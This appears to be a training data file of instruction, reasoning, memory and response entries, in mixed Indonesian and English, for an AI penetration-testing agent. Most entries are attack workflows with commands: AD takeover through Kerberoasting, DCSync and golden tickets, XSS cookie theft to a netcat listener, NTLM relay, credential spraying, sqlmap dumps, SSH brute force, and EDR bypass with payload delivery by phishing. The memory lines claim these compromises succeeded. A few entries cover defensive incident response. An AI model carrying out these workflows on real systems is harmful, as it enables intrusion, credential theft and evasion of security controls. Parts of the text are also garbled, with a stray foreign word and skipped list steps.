instruction: full recon workflow untuk corp.target.com
reasoning: tahap recon adalah fondasi, kualitas input menentukan kualitas output
passive dulu → tidak ada fingerprint di target logs
validate setiap output sebelum gunakan sebagai input tool berikutnya
reflection: chain output file langsung sebagai input tool berikutnya untuk efisiensi
memory: corp.target.com — 45 subdomain, 32 resolved, 18 live, 5 critical findings
response: Recon chain dimulai. subfinder → dnsx → httpx → nmap → nuclei

instruction: web vulnerability assessment workflow untuk https://api.target.com
reasoning: API endpoint berbeda dari web biasa — fokus pada authentication, rate limit, data exposure
parameter discovery penting untuk API: ffuf dengan wordlist API-specific
test setiap endpoint dengan method yang berbeda: GET, POST, PUT, DELETE
reflection: API testing butuh authentication token valid — setup dulu sebelum scan
memory: api.target.com — IDOR pada /user/{id}, SQLi pada /search, no rate limit
response: API assessment: ffuf endpoint discovery → 23 endpoints found, testing each...

instruction: privilege escalation workflow setelah initial shell di Linux
reasoning: initial foothold sebagai www-data atau low-priv user
enumerate semua PE vectors sistematis sebelum attempt
LinPEAS adalah automated, tapi review manual tetap penting
reflection: LinPEAS output sering banyak — fokus pada MERAH/KUNING dulu
memory: www-data → SUID /usr/bin/find → root via find -exec
response: PE enum: whoami=www-data → LinPEAS → SUID find detected!

instruction: wireless pentest workflow: WPA2 crack dan MITM
reasoning: wireless pentest dibagi: pasif (capture) dan aktif (inject/MITM)
harus miliki permission explicit dari owner jaringan
reflection: WPA3 tidak bisa di-crack dengan cara ini — check security mode dulu
memory: WPA2 handshake captured, PSK ditemukan
response: Monitor mode aktif. Capturing pada channel 6, BSSID target...

instruction: cloud misconfiguration hunt workflow di AWS
reasoning: cloud misconfiguration adalah low-hanging fruit yang sering diabaikan
urutan: identity → network → storage → monitoring
reflection: s3:GetObject dengan public ACL = data exposure — prioritas tertinggi
memory: AWS — 3 public S3 buckets (PII data), 5 SGs 0.0.0.0/0, 1 hardcoded key
response: AWS audit: prowler → 15 critical findings. S3 public buckets: 3.

instruction: malware analysis workflow: static ke dynamic
reasoning: always static dulu sebelum dynamic — lebih aman dan dapat IOC untuk monitoring
planning: review cape report: IOCs, behavior, C2
reflection: upload hash ke VirusTotal sebelum full analysis — mungkin sudah diketahui
memory: malware.bin — trojan dropper, C2: 185.220.101.45:4444, persistence: HKCU Run
response: Static analysis: strings extraction → C2 IP detected. Submitting ke CAPEv2 sandbox.

instruction: Active Directory compromise workflow dari domain user ke domain admin
reasoning: AD compromise = systematic path dari normal user ke full domain control
bloodhound untuk identify shortest path
kerberoasting sering fastest path jika SPN accounts exist
planning: upload ke BloodHound GUI, query shortest path ke DA
reflection: document setiap step dengan timestamp untuk report narrative
memory: domain.local — user → kerberoast svc_sql → crack → DCSync → domain admin
response: AD compromise: BloodHound path found. Kerberoasting svc_sql → hashcat → DCSync!

instruction: web application XSS to account takeover workflow
reasoning: XSS account takeover = steal session cookie atau perform CSRF via XSS
stored XSS lebih powerful dari reflected karena affect semua victims
cookie stealing butuh: no HttpOnly flag pada session cookie
planning: jika stored XSS: injected payload executed pada setiap visit
steal cookie dari attacker server log
replay cookie: burpsuite → change session cookie → access victim account
reflection: HttpOnly cookie tidak bisa dicuri via JS — check network tab untuk cookie flags
memory: target.com — stored XSS pada comment field, session cookie stolen, admin access
response: Stored XSS confirmed! Cookie listener: nc -lvnp 80 → cookie received → account access!

instruction: post-exploitation workflow setelah RCE pada web server
reasoning: setelah RCE: stabilize shell → enumerate → escalate → persist
urutan penting: jangan langsung PE tanpa understand environment
planning: export TERM=xterm; stty raw -echo; fg (full TTY)
whoami && id && hostname && ip addr (basic enum)
reflection: shell stabilization penting sebelum apapun — unstable shell kehilangan semua progress
memory: web server www-data → full TTY → config files berisi DB creds → mysql login
response: RCE → stable shell → enum: www-data, /var/www/.env berisi DB_PASSWORD!

instruction: mobile app API security testing workflow
reasoning: mobile app → extract APK → SSL bypass → proxy traffic → test API
API endpoints dari mobile app sering tidak di-test oleh web pentest
planning: grep -r 'http' target/smali/ | grep -i api (find API endpoints)
burpsuite proxy: configure mobile device proxy ke laptop
intercept dan test semua API calls dari mobile app
test: IDOR, auth bypass, injection pada mobile-specific endpoints
reflection: mobile API endpoints sering memiliki weaker validation dari web endpoints
memory: mobile app — 12 unique API endpoints, 3 IDOR, 1 SQLi (mobile-only endpoint)
response: Mobile pentest: apktool → endpoints found. frida SSL bypass → burpsuite capturing traffic.

instruction: network pivot workflow dari DMZ ke internal network
reasoning: pivot = menggunakan compromised host sebagai hop untuk reach isolated network
DMZ host dengan dual-NIC = bridge antara DMZ dan internal
SSH tunneling atau meterpreter routing untuk pivot
planning: identify: ip addr → host dengan 2 network interfaces
port forward via SSH: ssh -L 8080:internal.host:80 dmz_host
socks proxy: ssh -D 9050 dmz_host → proxychains untuk route traffic
reflection: proxychains hanya support TCP — UDP-based tools tidak akan work via SOCKS proxy
memory: DMZ pivot: dual-NIC host, SOCKS proxy via SSH, internal 10.10.10.0/24 scanned
response: Pivot setup: SSH SOCKS proxy → proxychains nmap internal → 12 hosts found!

instruction: credentials dump dan reuse workflow dalam Active Directory
reasoning: credential reuse = satu set credential yang works di multiple systems
setelah dump credentials: spray ke seluruh network untuk find reuse
planning: extract NTLM hashes dan cleartext dari output
document: which hosts respond, what access level
reflection: NTLM hash reuse sering lebih productive dari cleartext — PtH attack
memory: mimikatz: 5 sets cleartext, 12 NTLM hashes → spray → 8 additional hosts compromised
response: Mimikatz: sekurlsa → 5 cleartext, 12 NTLM. CrackMapExec spray → 8 more hosts!

instruction: cloud privilege escalation workflow di AWS
reasoning: AWS PE = dari low-priv IAM user ke AdministratorAccess
enumerate permissions dulu sebelum execute PE
common PE paths: IAM policy creation, Lambda, EC2 role assumption
planning: jika iam:CreatePolicyVersion: buat policy version dengan AdministratorAccess
verify: aws iam get-policy --policy-arn ARN (confirm new version active)
test: aws s3 ls (verify admin access)
reflection: log semua API calls ke CloudTrail — minimize noise dengan hanya call yang diperlukan
memory: AWS PE: iam:CreatePolicyVersion → admin policy → AdministratorAccess dalam 5 menit
response: AWS PE: pacu enum → CreatePolicyVersion available! Creating admin policy version...

instruction: forensics investigation workflow untuk suspected breach
reasoning: breach investigation = collect evidence → analyze → timeline → attribution
chain of custody dari awal: dokumentasikan setiap action
preserve before analyze: image dulu sebelum analisa
planning: memory dump: winpmem atau dumpit (Windows), LiME (Linux)
disk image: dd if=/dev/sda of=disk.img bs=4k status=progress
autopsy: load disk image, extract artifacts
reflection: hash image segera setelah acquire — proof of integrity untuk legal proceedings
memory: breach investigation: memory dump → svchost injection, disk → attacker tools in /tmp
response: Forensics workflow: memory dump + disk image acquired, hashed. volatility analyzing...

instruction: phishing email analysis dan response workflow
reasoning: phishing email = common initial vector, butuh quick analysis dan response
analyze dulu sebelum click apapun — gunakan isolated environment
extract IOCs untuk update email gateway dan SIEM
planning: headers: view raw message headers → analyze Received, SPF, DKIM, DMARC
save attachment → VM yang isolated → check dengan VirusTotal hash
URL analysis: extract URLs → URLScan.io → check reputation
sender IP: abuseipdb lookup, whois, reverse DNS
sandbox: any.run atau joe sandbox untuk attachment analysis
IOC extract: IP, domain, hash, email → add ke block list
SIEM: search for other recipients + clicked indicators
reflection: NEVER analyze attachment di production machine — always isolated VM atau sandbox
memory: phishing email: sender spoof valid, attachment → dropper confirmed, 5 other recipients
response: Phishing analysis: header spoof detected, attachment → any.run → dropper! 5 recipients found.

instruction: network traffic analysis untuk C2 beacon detection
reasoning: C2 beacon = regular outbound connection dari malware ke command server
characteristics: reguler interval, kecil payload, unusual destination
zeek logs + statistical analysis untuk detection
planning: cat conn.log | zeek-cut ts id.orig_h id.resp_h resp_bytes duration | sort
python3: analyze conn.log untuk reguler interval patterns
cat dns.log | zeek-cut query answers | sort | uniq -c (DNS analysis)
tshark -r pcap -Y 'tcp.stream' -T fields -e ip.dst | sort | uniq -c | sort -rn (top destinations)
check unusual destinations: abuseipdb, virustotal untuk IP reputation
reflection: beaconing interval sering sedikit jitter untuk avoid detection — gunakan statistical analysis
memory: suspicious.pcap: beacon tiap 60±5 detik ke 185.220.x.x, DNS tunneling subdomains
response: C2 beacon: zeek conn.log → regular 60s interval ke 185.220.x.x detected!

instruction: Docker container security audit workflow
reasoning: container audit = image scanning + runtime security + configuration review
image yang sudah lama sering berisi vulnerable packages
runtime: privileged, capability, mount issues
planning: trivy image nginx:latest (scan image untuk vulnerabilities)
docker exec -it container_id /bin/sh (enter container untuk manual check)
reflection: docker.sock mount = immediate host escape — instant critical finding
memory: Docker audit: nginx image 45 CVEs, 1 container với docker.sock mounted
response: Docker audit: trivy scan → 45 CVEs in nginx. docker.sock mounted → escape possible!

instruction: automated vulnerability scan dan triage workflow
reasoning: scan → triage → prioritize → assign → track → verify adalah VM cycle
automation penting untuk consistency dan speed
prioritization berdasarkan: CVSS + asset criticality + exploitability
planning: nessus scan: launch scan terhadap target range
export results sebagai CSV atau via API
python3 parse_nessus.py results.csv → categorize by severity
enrich: check EPSS score dan CISA KEV untuk exploitability
create Jira tickets untuk Critical dan High (auto-create via API)
assign ke responsible team berdasarkan asset owner
tracking dashboard: update via Jira API
reflection: EPSS score + CISA KEV = better prioritization dari CVSS alone
memory: VM workflow: 2500 findings → triage → 45 critical, 200 high, 89% dengan Jira tickets
response: VM workflow: Nessus scan → parse → EPSS enrich → auto-create 245 Jira tickets!

instruction: incident response workflow untuk data breach
reasoning: data breach IR = contain → assess scope → notify → remediate → learn
notification timeline: GDPR 72 jam, HIPAA 60 hari, state laws berbeda
preserve ALL evidence sebelum cleanup
planning: 1. Detection → IR team mobilize dalam <1 jam
3. Evidence preserve: memory dump, logs, disk images
4. Scope: apa data yang exposed? Berapa records?
6. Legal/compliance: notify DPO, assess notification requirements
7. Eradication: remove access, patch vuln, reset credentials
8. Recovery: restore systems dari clean backup
reflection: notification requirements sering lebih strict dari yang di-expect — consult legal early
memory: data breach: 50k PII records exposed, root cause: SQL injection, GDPR notification required
response: Breach IR: isolation selesai. Preserving evidence. Scope: 50k records. Legal notified.

instruction: threat hunt untuk insider threat indicators
reasoning: insider threat hunt = behavioral analytics + data access patterns + anomaly detection
focus: unusual data access, large download, off-hours activity, sensitive file access
planning: SIEM query: user access volume > 2 std deviations dari baseline
DLP alert: large file transfer ke external (personal email, cloud storage)
email analysis: external forwarding rules configured
USB activity: removable media usage dari sensitive systems
VPN: off-hours logins + unusual geographic location
Database: bulk SELECT query dari specific user pada production DB
correlation: combine semua indicators untuk suspect shortlist
reflection: false positive tinggi untuk insider threat — correlation multiple indicators penting
memory: insider hunt: 1 suspect via bulk DB download + external email forward + off-hours VPN
response: Insider hunt: DB bulk access → external forward → off-hours VPN. 1 suspect identified.

instruction: subdomain takeover exploitation workflow
reasoning: subdomain takeover = claim abandoned service yang masih di-CNAME
berbeda service = berbeda cara claim
planning: manual verify: curl SUBDOMAIN dan observe error message
identify service: GitHub Pages? Heroku? S3? Netlify?
GitHub Pages takeover: create repo github.com/user/SUBDOMAIN
add CNAME file dengan nilai subdomain
verify: curl SUBDOMAIN → controlled content served!
document sebagai finding — DO NOT deploy malicious content
reflection: HANYA verify kepemilikan dengan neutral content — jangan exploit lebih jauh
memory: staging.target.com → GitHub Pages takeover, controlled content served
response: Takeover: staging.target.com CNAME ke unclaimed GitHub Pages. Creating repo → serving content!

instruction: ransomware incident containment dan recovery workflow
reasoning: ransomware IR memiliki time pressure — setiap detik lebih banyak file encrypted
containment priority: network isolation > evidence > everything else
planning: T+0: Detection → isolasi immediate semua infected hosts dari network
T+30min: Identify scope — scan network untuk indicators of infection
T+1h: Evidence preserve — memory dump infected hosts sebelum shutdown
T+2h: Identify variant — upload sample ke ID-Ransomware atau VirusTotal
T+3h: Check backup integrity — verify clean backup exists
T+5h: Restore — recovery dari clean backup
T+24h: Post-incident — patch vuln, harden, improve monitoring
reflection: backup yang infected juga tidak berguna — verify backup date dan integrity dulu
memory: LockBit 3.0 IR: 5 hosts isolated, backup clean (2 hari lalu), recovery 6 jam
response: Ransomware IR: T+0 isolation. T+1h: LockBit 3.0 identified. T+3h: clean backup verified.

instruction: OAuth token theft dan account takeover workflow
reasoning: OAuth token theft = steal access token untuk impersonate user
vectors: XSS + token in URL/localStorage, SSRF, open redirect
planning: identify: apakah token disimpan di URL fragment atau localStorage?
intercept: burpsuite untuk capture token dari API response
replay: use stolen token untuk authenticated API calls
reflection: PKCE mencegah authorization code interception — check apakah diimplementasi
memory: OAuth: token di localStorage, XSS steal berhasil, API calls as victim confirmed
response: OAuth attack: token in localStorage → XSS steal → API calls as victim user!

instruction: DNS reconnaissance dan subdomain enumeration workflow
reasoning: DNS recon adalah foundation dari external footprint
multiple technique untuk maximum coverage
planning: cat subfinder.txt amass.txt brute.txt ct.txt | sort -u > all_subs.txt
reflection: merge dan deduplicate sebelum DNS resolve untuk efisiensi
memory: target.com — 234 unique subs dari 4 sources, 156 resolved, 89 live
response: DNS recon: subfinder+amass+brute+CT → 234 unique, dnsx resolve → 156 active

instruction: endpoint detection bypass dan payload delivery workflow
reasoning: EDR bypass workflow: identify → analyze hooks → craft bypass → test → deliver
selalu test di isolated environment dengan same EDR version
planning: test di VM dengan same EDR: does it run? Alert fired?
delivery: phishing email, USB drop, or via compromised system
verify execution: check callback dari C2
reflection: selalu test di isolated lab sebelum production environment
memory: CrowdStrike bypass: direct syscall + obfuscation, payload executed undetected
response: Payload delivery: AMSITrigger scan → obfuscate → isolated test → CrowdStrike bypass!

instruction: SQL injection exploitation dan data extraction workflow
reasoning: SQLi exploitation = dari detection ke data extraction secara sistematis
tidak semua SQLi bisa langsung dump data — perlu identify DB type dulu
planning: sqlmap -u URL -D targetdb -T users -C username,password --dump (dump data)
save: sqlmap output ke file untuk evidence
reflection: minimal extraction untuk PoC — jangan dump entire database production
memory: SQLi: MySQL db, 'users' table dengan 50k records, admin:hash dumped as PoC
response: SQLi: --dbs → targetdb found. --dump users → 50k records, admin credentials extracted.

instruction: LDAP enumeration workflow untuk Active Directory
reasoning: LDAP enum = query AD untuk users, groups, policies, GPO
authenticated LDAP query jauh lebih informatif dari anonymous
ldapsearch, windapsearch, atau ldapdomaindump untuk structured output
reflection: servicePrincipalName attribute = kerberoastable account — prioritas untuk attack
memory: AD LDAP: 1200 users, 45 kerberoastable, 12 ASREP roastable
response: LDAP dump: 1200 users, 45 SPN accounts (kerberoastable), 12 ASREP roastable found!

instruction: buffer overflow exploitation workflow untuk CTF
reasoning: buffer overflow = overwrite return address untuk hijack execution flow
steps: find offset → control EIP → find gadgets → shellcode
planning: checksec binary (identify protections: NX, PIE, stack canary, RELRO)
cyclic 200 | ./binary → gdb: info registers → find EIP value
find: ret gadget atau jmp esp → ROPgadget --binary ./binary --ret
test payload dalam gdb sebelum remote
reflection: checksec output menentukan exploitation technique — NX=no shellcode, need ROP
memory: CTF pwn: offset 64, NX enabled, ret2libc → system('/bin/sh') → shell!
response: Pwn: checksec → NX enabled. cyclic offset=64. ret2libc: system('/bin/sh') → shell!

instruction: cloud S3 bucket dan storage misconfiguration workflow
reasoning: cloud storage misconfig = paling sering ditemukan dalam cloud assessment
S3 public = data exposure, writable = malware hosting, logging off = blind
planning: for bucket in $(aws s3 ls | awk '{print $3}'); do aws s3api get-bucket-acl --bucket $bucket; done
aws s3api get-bucket-policy --bucket TARGET (check bucket policy)
aws s3 ls s3://target-bucket --no-sign-request (test public access)
aws s3api get-public-access-block --bucket TARGET (public block setting)
reflection: S3 Block Public Access di account level overrides bucket-level settings
memory: S3 audit: 3 public buckets, 1 writable (malware hosting risk), 5 without logging
response: S3 audit: 3 public buckets found, 1 writable via no-sign-request. Logging: 5 disabled!

instruction: web server hardening verification workflow
reasoning: hardening verification = setelah hardening, verify configuration berjalan sesuai spec
test setiap hardening item secara praktis, bukan hanya config review
reflection: hardening checklist sering incomplete — always test practically, tidak hanya review config file
memory: web hardening: TLS 1.2+, CSP enabled, no TRACE, no server version — PASSED
response: Hardening verify: TLS 1.2+ ✓, CSP ✓, TRACE disabled ✓, no server header ✓ — PASSED

instruction: source code security review workflow
reasoning: code review workflow = systematic analysis untuk find security issues
automated tools untuk pattern detection, manual untuk logic
start dengan high-risk area: auth, payment, user input
planning: review: authentication logic, session management code
review: SQL query construction — ORM atau raw query?
reflection: grep untuk dangerous functions adalah quick win untuk finding candidates
memory: code review: 3 eval() calls, 2 hardcoded secrets, SQL string concat in legacy module
response: Code review: semgrep → 12 findings. grep eval → 3 matches. SQL concat → manual review!

instruction: kerberos attack chain workflow
reasoning: kerberos attacks: ASREP roasting → kerberoasting → golden/silver ticket
tidak semua attack applicable — check prerequisites dulu
planning: impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator (golden ticket)
reflection: golden ticket persistence butuh krbtgt password reset DUA KALI untuk invalidate
memory: Kerberos chain: ASREP→crack→lateral→DCSync→krbtgt→golden ticket (permanent access)
response: Kerberos chain: ASREP roast → crack → lateral → DCSync → krbtgt → golden ticket!

instruction: web application authentication bypass workflow
reasoning: auth bypass = akses resources tanpa valid credentials
common: SQL injection, logic flaws, default creds, broken auth
planning: test: JWT none algorithm — alg:none, remove signature
test: password reset logic — reset dengan attacker email, intercept token
test: direct object reference — /admin?id=1 tanpa auth
test: forced browsing — /admin/dashboard langsung tanpa login
test: cookie tampering — change role=user ke role=admin
reflection: auth bypass sering kombinasi dari multiple teknik — test semuanya
memory: target: SQLi bypass admin'-- , JWT none algorithm bypass, forced browse /admin
response: Auth bypass: SQLi admin'-- → login! JWT none alg → bypass! Direct /admin → accessible!

instruction: SMTP dan email server security audit workflow
reasoning: email server audit = relay test, banner info, user enum, TLS check
open relay = server mau relay email untuk siapapun = spam dan reputasi damage
planning: swaks --to victim@company.com --from attacker@evil.com --server mail.target.com (open relay test)
check SPF: dig txt target.com | grep spf
reflection: open relay = critical finding — ISPs bisa blacklist IP server
memory: mail.target.com: open relay confirmed, VRFY enum works, no TLS, SPF softfail
response: SMTP audit: swaks open relay test → ACCEPTED! VRFY admin → user exists. TLS: disabled!

instruction: SSH security audit workflow
reasoning: SSH audit = version, ciphers, key exchange algorithms, authentication methods
weak: SSH1, password auth, weak ciphers (CBC, arcfour)
ssh-audit untuk comprehensive check
planning: hydra -l root -P common_passwords.txt ssh://target.com -t 4 (brute force check)
check: authorized_keys files untuk unexpected keys
reflection: ssh-audit output color coded: FAIL=red, WARN=yellow — focus on FAIL dulu
memory: SSH audit: SSH 7.4, CBC ciphers, password auth enabled, root login allowed
response: SSH audit: ssh-audit → 5 weak ciphers, password auth, root login allowed! Critical.

instruction: NTLM relay attack workflow
reasoning: NTLM relay = capture NTLM auth dan relay ke target yang tidak menggunakan signing
SMB signing disabled = relay attack possible
prerequisite: listener yang menerima NTLM auth (LLMNR/NBT-NS poisoning atau force auth)
planning: crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt (find targets tanpa signing)
tunggu auth attempt → relay → shell atau SAM dump
reflection: SMB signing enabled = relay tidak possible ke SMB — try LDAP atau HTTP relay
memory: NTLM relay: 15 targets without signing, responder+ntlmrelayx → 3 SAM dumps
response: NTLM relay: responder poison → captured auth → relay → SAM dump from 3 hosts!

instruction: web scraping dan OSINT aggregation workflow untuk target
reasoning: web scraping untuk OSINT = collect public information secara automated
respect robots.txt, tidak terlalu agresif pada rate
planning: theHarvester -d target.com -b all -l 200 (email + subdomain dari multiple sources)
gau target.com (historical URLs dari wayback + crawlers)
merge semua results ke master OSINT database
deduplicate dan categorize: emails, IPs, subdomains, technologies
reflection: merge dari 5+ sources memberikan 2-3x lebih banyak data dari single source
memory: OSINT aggregate: 234 emails, 156 subdomains, 45 exposed services, 12 technologies
response: OSINT aggregate: 6 sources merged → 234 emails, 156 subs, 45 exposed services!
